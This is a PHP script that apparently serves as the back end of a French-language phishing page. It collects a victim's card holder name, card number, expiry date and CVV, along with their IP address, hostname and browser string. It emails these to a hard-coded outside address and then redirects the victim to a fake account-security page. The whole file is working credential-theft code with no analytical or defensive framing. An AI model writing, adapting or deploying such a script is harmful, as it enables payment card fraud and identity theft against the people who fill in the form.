<?php
$ip = getenv("REMOTE_ADDR");
$bilmsg .= "-------------- ########################----------\n";
$bilmsg .= "IP              : $ip\n";
$bilmsg .= "HOST            : ".gethostbyaddr($ip)."\n";
$bilmsg .= "browser         : ".$_SERVER['HTTP_USER_AGENT']."\n";
$bilmsg .= "--------------###################### ----------\n";
$bilmsg .= "Nom du titulaire         : ".$_POST['Nodtit']."\n";
$bilmsg .= "N° de la carte          : ".$_POST['Numerocarrttt']."\n";
$bilmsg .= "Date d'expiration         : ".$_POST['Dateexpiration']."\n";
$bilmsg .= "CVV code           : ".$_POST['CVCOD']."\n";
$bilmsg .= "--------------########################----------\n";
$bilsnd = "zero.plan@gmx.fr";
$bilsub = "'InF cart'$ip";
$bilhead = "From: InF cart '$ip<wer@info.com>";
$bilhead .= $_POST['eMailAdd']."\n";
$bilhead .= "MIME-Version: 1.0\n";
mail($bilsnd,$bilsub,$bilmsg,$bilhead);

header("Location:informationsecuritecompte.html?id=454587545&mail&from&smartphone?454584515155184s5454a548sa54a514s515num?454515577774548454client");
?>